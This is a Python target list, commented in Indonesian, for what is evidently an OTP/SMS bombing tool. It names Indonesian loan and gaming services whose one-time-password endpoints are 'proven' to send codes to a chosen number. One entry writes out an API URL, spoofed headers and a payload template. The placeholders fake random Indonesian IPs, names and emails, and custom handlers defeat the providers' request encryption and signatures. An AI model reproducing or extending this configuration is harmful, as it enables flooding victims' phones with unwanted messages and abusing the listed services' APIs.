"""
targets.py — Daftar target OTP yang telah diverifikasi.

Hanya berisi provider yang TERBUKTI berhasil mengirimkan OTP ke nomor tujuan.

Schema setiap entry:
  name        : str        — nama tampilan
  post_type   : str        — 'json' | nama custom handler di handlers.py
  url         : str        — endpoint (hanya untuk post_type='json')
  referer     : str        — Referer header (opsional)
  headers     : dict       — header tambahan (opsional)
  payload     : str        — template JSON dengan {placeholder}
  number_fmt  : callable   — fungsi format nomor dari utils.py
  success_on  : list[str]  — regex/string dicek di response body
  timeout     : int        — detik, default 15
  enabled     : bool       — default True

Placeholder di payload:
  {number}  — nomor setelah diformat oleh number_fmt
  {raw}     — nomor strip 0 (tanpa kode negara)
  {rand}    — UUID v4 random
  {ip}      — IP Indonesia random
  {email}   — email random
  {name}    — nama Indonesia random
  {pw}      — password random
"""
from __future__ import annotations

from utils import fmt_08, fmt_plus

TARGETS: list[dict] = [

    # ── 1. Indosaku — AES-ECB encrypted, SMS/WA ──────────────
    {
        'name'      : 'Indosaku',
        'post_type' : 'indosaku',
        'number_fmt': fmt_08,
        'success_on': ['tsFzo'],
    },

    # ── 2. RupiahCepat — AES-CBC + MD5 signature, WA ─────────
    {
        'name'      : 'RupiahCepat',
        'post_type' : 'rupiahcepat',
        'number_fmt': fmt_08,
        'success_on': ['"code":0'],
    },

    # ── 3. DuniaGames — JSON, endpoint berubah (401/Cloudflare) ──
    # Dinonaktifkan sementara sampai endpoint baru ditemukan.
    {
        'name'      : 'DuniaGames',
        'post_type' : 'json',
        'url'       : 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
        'referer'   : 'https://duniagames.co.id/newregister/phone/email-register',
        'headers'   : {
            'Content-Type': 'application/json',
            'Origin'       : 'https://duniagames.co.id',
            'x-device'     : '{rand}',
        },
        'payload'   : '{"phoneNumber":"{number}","userName":"{raw}"}',
        'number_fmt': fmt_plus,
        'success_on': ['"code":0'],
        'timeout'   : 20,
        'enabled'   : False,
    },

    # ── 4. Cairin — form-data, SMS ────────────────────────────
    {
        'name'      : 'Cairin',
        'post_type' : 'cairin',
        'number_fmt': fmt_08,
        'success_on': ['"code":"0"'],
    },
]
